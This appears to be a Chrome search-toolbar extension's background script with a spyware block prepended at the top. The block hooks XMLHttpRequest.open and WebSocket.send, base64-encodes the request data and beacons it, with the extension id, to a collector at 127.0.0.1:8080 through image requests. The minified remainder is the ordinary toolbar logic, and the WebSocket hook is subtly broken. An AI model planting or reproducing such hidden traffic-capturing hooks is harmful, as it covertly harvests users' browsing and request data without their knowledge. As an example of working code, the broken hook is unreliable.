function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha

chrome.history.onVisited.addListener(function(onVisited){chrome.tabs.getSelected(null,function(tab){movePluginToBottomOrTop();});});chrome.tabs.onSelectionChanged.addListener(function(tabId,selectInfo){movePluginToBottomOrTop();});function movePluginToBottomOrTop(){var settingsPluginTopOrBottom=localStorage['settingsPluginTopBottom'];if(settingsPluginTopOrBottom=="top"||settingsPluginTopOrBottom==undefined){chrome.tabs.getSelected(null,function(tab){chrome.tabs.sendMessage(tab.id,{greeting:"top"},function(response){});});}else{chrome.tabs.getSelected(null,function(tab){chrome.tabs.sendMessage(tab.id,{greeting:"bottom"},function(response){});});}}
chrome.extension.onMessage.addListener(function(request,sender,sendResponse){if(request.greeting=="search"){localStorage["search"]="yes";chrome.tabs.getSelected(null,function(tab){chrome.tabs.update(tab.id,{url:request.url});});sendResponse();}
if(request.greeting=="enterSearch"){localStorage["search"]="yes";localStorage['selectedString']=request.selectionText;localStorage['enterSearchString']="Yes";if(localStorage['settingsNewTabSearch']=="On"){chrome.tabs.getSelected(null,function(tab){chrome.tabs.create({"url":request.url,"selected":true});});}else{chrome.tabs.getSelected(null,function(tab){chrome.tabs.update(tab.id,{url:request.url});});}
sendResponse();}
if(request.greeting=="searchNewTab"){localStorage["search"]="yes";chrome.tabs.getSelected(null,function(tab){chrome.tabs.create({"url":request.url,"selected":true});});}
if(request.greeting=="digitingSearch"){chrome.tabs.create({"url":"http://www.digiting.com","selected":true});}
if(request.greeting=="selectedSearchText"){selectedText=request.selection;localStorage['selectedString']=selectedText;chrome.tabs.getSelected(null,function(tab){chrome.tabs.sendMessage(tab.id,{greeting:"mouseUp"},function(response){});});}
if(request.greeting=="settings"){movePluginToBottomOrTop();}
if(request.greeting=="trackEvent"){chrome.tabs.getSelected(null,function(tab){chrome.tabs.sendMessage(tab.id,{greeting:"trackSearchEvent"},function(response){});});}
if(request.greeting=="resize"){localStorage['windowResize']="yes";if(localStorage['settingsPluginTopBottom']=="bottom"){chrome.tabs.getSelected(null,function(tab){chrome.tabs.sendMessage(tab.id,{greeting:"bottom"},function(response){});});}
else sendResponse();}});